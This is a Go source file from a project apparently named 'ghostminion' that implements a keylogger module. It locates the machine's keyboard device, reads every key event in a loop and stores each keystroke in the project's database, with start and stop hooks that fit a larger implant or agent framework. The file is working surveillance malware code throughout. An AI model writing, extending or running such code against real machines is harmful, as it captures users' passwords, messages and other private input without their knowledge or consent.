package apps

import (
	"fmt"
	"ghostminion/db"
	"ghostminion/db/dbDataTypes"
	"github.com/MarinX/keylogger"
	"sync"
)

type KeyLoggerApp struct{}

var stopKeyloggerApp = false

func (c *KeyLoggerApp) Start(wg *sync.WaitGroup) {
	defer wg.Done()
	keyboard := keylogger.FindKeyboardDevice()
	if len(keyboard) <= 0 {
		fmt.Println("No keyboard found...you will need to provide manual input path")
		return
	}
	lgr.Debug("Found keyboard at path: ", keyboard)
	keyLogger, err := keylogger.New(keyboard)
	if err != nil {
		lgr.Error("Error creating keylogger instance: ", err)
		return
	}
	defer func(keyLogger *keylogger.KeyLogger) {
		err := keyLogger.Close()
		if err != nil {
			lgr.Error("Error closing keylogger")
		}
	}(keyLogger)
	for stopKeyloggerApp != true {
		events := keyLogger.Read()
		for e := range events {
			if e.Type == keylogger.EvKey {
				err = db.GetInstance().WriteData("", dbDataTypes.Keyloggers, []byte(e.KeyString())) // replace reqId
				if err != nil {
					lgr.Error("Error writing keylogger data: ", err)
				}
			}
		}
	}
}

func (c *KeyLoggerApp) Stop() {
	stopKeyloggerApp = true
}

func (c *KeyLoggerApp) Validate() error {
	return nil
}
